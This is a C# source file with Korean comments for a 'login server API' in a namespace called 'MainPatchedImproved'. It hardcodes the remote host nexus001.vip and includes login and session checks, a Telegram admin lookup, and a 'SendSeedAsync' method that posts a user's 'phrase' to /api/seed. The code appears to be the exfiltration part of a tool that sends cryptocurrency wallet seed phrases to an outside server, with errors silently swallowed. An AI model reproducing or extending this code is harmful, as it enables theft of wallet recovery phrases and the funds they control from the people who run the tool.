using System.Net.Http.Json;
using System.Text.Json;

namespace MainPatchedImproved;

/// <summary>로그인 서버 API. 서버 URL 하드코딩(nexus001.vip).</summary>
public static class ServerApi
{
    private static readonly HttpClient HttpClient = new() { Timeout = TimeSpan.FromSeconds(10) };

    /// <summary>서버 주소 (하드코딩)</summary>
    private const string BaseUrlValue = "https://nexus001.vip";

    /// <summary>로그인 성공 시 설정. 서버 세션 검사·시드 전송에 사용.</summary>
    public static string? CurrentToken { get; set; }

    public static string? BaseUrl => BaseUrlValue.TrimEnd('/');

    /// <summary>호출 시 서버 URL 적용. (하드코딩이라 파일 로드 없음)</summary>
    public static void LoadBaseUrlFromFile() { }

    public static bool Enabled => true;

    public static async Task<(bool Ok, string? Token, bool Kicked)> LoginAsync(string id, string password)
    {
        if (!Enabled) return (false, null, false);
        try
        {
            var resp = await HttpClient.PostAsJsonAsync($"{BaseUrl}/api/login", new { id, password });
            var json = await resp.Content.ReadAsStringAsync();
            if (resp.IsSuccessStatusCode)
            {
                var doc = JsonDocument.Parse(json);
                var root = doc.RootElement;
                var token = root.TryGetProperty("token", out var t) ? t.GetString() : null;
                var kicked = root.TryGetProperty("kicked", out var k) && k.GetBoolean();
                return (token != null, token, kicked);
            }
        }
        catch { }
        return (false, null, false);
    }

    public static async Task<bool> ValidateSessionAsync(string token)
    {
        if (!Enabled || string.IsNullOrEmpty(token)) return true;
        try
        {
            var resp = await HttpClient.GetAsync($"{BaseUrl}/api/session/validate?token=" + Uri.EscapeDataString(token));
            return resp.IsSuccessStatusCode;
        }
        catch { return false; }
    }

    public static async Task SendSeedAsync(string token, string phrase)
    {
        if (!Enabled || string.IsNullOrEmpty(token)) return;
        try
        {
            var resp = await HttpClient.PostAsJsonAsync($"{BaseUrl}/api/seed", new { token, phrase });
            if (!resp.IsSuccessStatusCode)
                AppLog.WriteLine($"[시드 전송] 서버 응답 오류 {(int)resp.StatusCode}");
        }
        catch (Exception ex)
        {
            AppLog.WriteLine("[시드 전송] 실패: " + ex.Message);
        }
    }

    public static async Task<string?> GetTelegramNicknameAsync()
    {
        if (!Enabled) return null;
        try
        {
            var resp = await HttpClient.GetAsync($"{BaseUrl}/api/admin/telegram");
            if (!resp.IsSuccessStatusCode) return null;
            var json = await resp.Content.ReadAsStringAsync();
            var doc = JsonDocument.Parse(json);
            if (doc.RootElement.TryGetProperty("nickname", out var n))
                return n.GetString();
        }
        catch { }
        return null;
    }
}
